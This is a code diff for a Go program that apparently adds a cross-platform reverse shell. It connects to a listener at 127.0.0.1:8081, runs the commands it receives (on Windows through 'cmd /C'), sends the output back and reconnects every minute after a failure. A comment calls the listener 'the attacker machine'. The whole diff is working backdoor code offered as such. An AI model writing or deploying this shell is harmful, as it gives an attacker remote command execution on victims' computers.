@@ -13,11 +13,12 @@ import (
 	"fmt"
 	"net"
 	"os/exec"
+	"runtime"
+	"time"
 )
 
-func main() {
-	//Going to connected to the attacker machine ( ip addr same as servers)
-	conn, _ := net.Dial("tcp", ":8081")
+func reverseForLinux() {
+	conn, _ := net.Dial("tcp", "127.0.0.1:8081")
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
 		//Executing the command from the server
@@ -25,6 +26,44 @@ func main() {
 		fmt.Println(string(cmd))
 		//sending back the result to server
 		conn.Write([]byte(cmd))
-
 	}
+}
+
+func reverseForWindows(host string) {
+	c, err := net.Dial("tcp", host)
+	if nil != err {
+		if nil != c {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverseForWindows(host)
+	}
+
+	r := bufio.NewReader(c)
+	for {
+		order, err := r.ReadString('\n')
+		if nil != err {
+			c.Close()
+			reverseForWindows(host)
+			return
+		}
+
+		cmd := exec.Command("cmd", "/C", order)
+		out, _ := cmd.CombinedOutput()
+
+		c.Write(out)
+	}
+}
+
+func main() {
+	if runtime.GOOS == "linux" {
+		reverseForLinux()
+	}
+
+	if runtime.GOOS == "windows" {
+		reverseForWindows("127.0.0.1:8081")
+	}
+
+
+
 }
